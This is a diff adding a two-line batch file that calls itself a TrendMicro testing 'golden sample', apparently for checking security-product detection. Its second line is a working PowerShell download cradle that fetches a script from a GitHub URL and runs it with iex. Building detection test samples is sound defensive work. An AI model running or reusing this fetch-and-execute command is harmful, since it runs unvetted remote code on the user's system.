@@ -1,0 +1,2 @@
+:: This is the Golden sample for TrendMicro testing purpose.
+cmd /c powershell.exe -nop iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jerry-yue/trendx-test/master/my_scrip.ps1')
